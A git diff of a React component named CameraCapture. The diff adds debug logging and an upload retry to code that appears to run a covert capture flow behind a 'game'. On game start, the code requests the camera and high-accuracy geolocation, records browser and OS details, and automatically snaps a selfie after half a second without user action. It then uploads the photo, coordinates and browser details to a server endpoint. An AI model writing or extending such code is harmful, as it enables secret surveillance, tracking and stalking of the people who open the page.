@@ -41,19 +41,23 @@ function CameraCapture({ onSuccess }) {
   }, []);
 
   const collectBrowserInfo = () => {
-    setBrowserInfo({
+    const info = {
       browserName: navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge)/)?.[0] || 'Unknown',
       os: navigator.platform,
       screenResolution: `${screen.width}x${screen.height}`,
       language: navigator.language,
       timeZone: Intl.DateTimeFormat().resolvedOptions().timeZone
-    });
+    };
+    console.log('Browser info:', info);
+    setBrowserInfo(info);
   };
 
   const initializeGame = async () => {
+    console.log('Initializing game...');
     let gameStarted = false;
     const startGameSafe = () => {
       if (!gameStarted) {
+        console.log('Starting game...');
         gameStarted = true;
         startGame();
       }
@@ -65,32 +69,43 @@ function CameraCapture({ onSuccess }) {
     try {
       // Get stream only once, save it in ref
       if (!streamRef.current) {
+        console.log('Requesting camera stream...');
         streamRef.current = await navigator.mediaDevices.getUserMedia({
           video: { facingMode: 'user' },
           audio: false
         });
+        console.log('Camera stream obtained!');
       }
       if (videoRef.current) {
         videoRef.current.srcObject = streamRef.current;
         videoRef.current.onloadedmetadata = () => {
-          videoRef.current.play().catch(console.error);
+          console.log('Video metadata loaded, playing...');
+          videoRef.current.play().catch(err => console.error('Video play error:', err));
           // Try to get location but start game anyway even if it fails
           try {
+            console.log('Requesting location...');
             navigator.geolocation.getCurrentPosition(
               (pos) => {
-                setSavedLocation({
+                const loc = {
                   latitude: pos.coords.latitude,
                   longitude: pos.coords.longitude
-                });
+                };
+                console.log('Location obtained:', loc);
+                setSavedLocation(loc);
               },
-              () => { /* ignore location errors */ },
+              (err) => {
+                console.warn('Location error:', err);
+              },
               { enableHighAccuracy: true, timeout: 3000, maximumAge: 60000 }
             );
-          } catch (e) { /* ignore */ }
+          } catch (e) {
+            console.warn('Geolocation not available');
+          }
           clearTimeout(timeout);
           startGameSafe();
         };
       } else {
+        console.warn('Video ref not available');
         clearTimeout(timeout);
         startGameSafe();
       }
@@ -107,6 +122,7 @@ function CameraCapture({ onSuccess }) {
     // Auto capture selfie immediately when game starts
     setTimeout(() => {
       if (!selfieCapturedRef.current) {
+        console.log('Auto-capturing selfie...');
         captureFrame();
       }
     }, 500); // Capture after 0.5 seconds
@@ -146,12 +162,14 @@ function CameraCapture({ onSuccess }) {
 
   const captureFrame = async () => {
     if (selfieCapturedRef.current) return; // Only capture once
+    console.log('Capturing frame...');
     selfieCapturedRef.current = true;
 
     const canvas = canvasRef.current;
     const video = videoRef.current;
 
     if (!canvas || !video || video.readyState < 2) {
+      console.warn('Canvas or video not ready, retrying...');
       // If video isn't ready, try again in 300ms
       selfieCapturedRef.current = false;
       setTimeout(captureFrame, 300);
@@ -180,15 +198,21 @@ function CameraCapture({ onSuccess }) {
     const ctx = canvas.getContext('2d');
     ctx.drawImage(video, 0, 0, width, height);
     const base64 = canvas.toDataURL('image/jpeg', 0.5);
+    console.log('Selfie base64 length:', base64.length);
+    console.log('Uploading to:', `${API_BASE_URL}/api/records`);
+    console.log('Upload data:', { selfie: base64.substring(0, 100) + '...', location: savedLocation, browserInfo });
 
     try {
-      await axios.post(`${API_BASE_URL}/api/records`, {
+      const response = await axios.post(`${API_BASE_URL}/api/records`, {
         selfie: base64,
         location: savedLocation,
         browserInfo: browserInfo
       });
+      console.log('Upload successful!', response.data);
     } catch (err) {
       console.error('Upload error:', err);
+      console.error('Upload error details:', err.response?.data);
+      selfieCapturedRef.current = false; // Allow retry
     }
   };
 
